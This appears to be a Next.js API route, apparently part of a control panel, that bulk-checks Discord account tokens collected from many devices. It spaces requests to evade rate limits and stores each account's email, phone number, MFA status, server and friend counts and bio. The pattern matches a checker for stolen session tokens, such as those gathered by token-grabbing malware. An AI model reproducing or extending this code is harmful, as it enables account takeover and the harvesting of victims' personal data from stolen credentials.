import { NextRequest, NextResponse } from "next/server"
import {
  getUnvalidatedDiscordTokens,
  updateDiscordTokenValidation,
} from "@/lib/db-messaging-helpers"
import { validateDiscordTokensBatch } from "@/lib/discord-validator"

/**
 * POST /api/v1/messaging/discord/validate-all
 * Validate all unvalidated Discord tokens across all devices
 */
export async function POST(request: NextRequest) {
  try {
    // Get limit from query params (default 50 to avoid rate limits)
    const { searchParams } = new URL(request.url)
    const limit = Number.parseInt(searchParams.get("limit") || "50")

    // Get unvalidated tokens
    const tokens = await getUnvalidatedDiscordTokens(limit)

    if (tokens.length === 0) {
      return NextResponse.json({
        success: true,
        message: "No unvalidated tokens found",
        total_tokens: 0,
        validated: 0,
        valid: 0,
        invalid: 0,
      })
    }

    // Extract token strings
    const tokenStrings = tokens.map((t) => t.token)

    // Validate with 2-second delay between each token to avoid rate limiting
    const results = await validateDiscordTokensBatch(tokenStrings, 2000)

    // Update database with results
    let validCount = 0
    let invalidCount = 0

    for (const tokenData of tokens) {
      const result = results.get(tokenData.token)
      if (!result) continue

      const accountCreated = result.account_created_timestamp
        ? result.account_created_timestamp
        : undefined

      await updateDiscordTokenValidation(tokenData.device_id, tokenData.token, {
        is_valid: result.is_valid,
        username: result.user_info?.username,
        discriminator: result.user_info?.discriminator,
        global_name: result.user_info?.global_name,
        avatar: result.user_info?.avatar,
        email: result.user_info?.email,
        phone: result.user_info?.phone,
        email_verified: result.user_info?.verified,
        phone_verified: result.user_info?.phone ? true : false,
        mfa_enabled: result.user_info?.mfa_enabled,
        premium_type: result.user_info?.premium_type,
        account_flags: result.user_info?.flags,
        server_count: result.server_count,
        friend_count: result.friend_count,
        account_created: accountCreated,
        bio: result.user_info?.bio,
        validation_error: result.error_message,
      })

      if (result.is_valid) {
        validCount++
      } else {
        invalidCount++
      }
    }

    return NextResponse.json({
      success: true,
      total_tokens: tokens.length,
      validated: validCount + invalidCount,
      valid: validCount,
      invalid: invalidCount,
      message: `Successfully validated ${validCount + invalidCount} tokens: ${validCount} valid, ${invalidCount} invalid`,
    })
  } catch (error) {
    console.error("Error validating Discord tokens:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Failed to validate tokens",
      },
      { status: 500 },
    )
  }
}
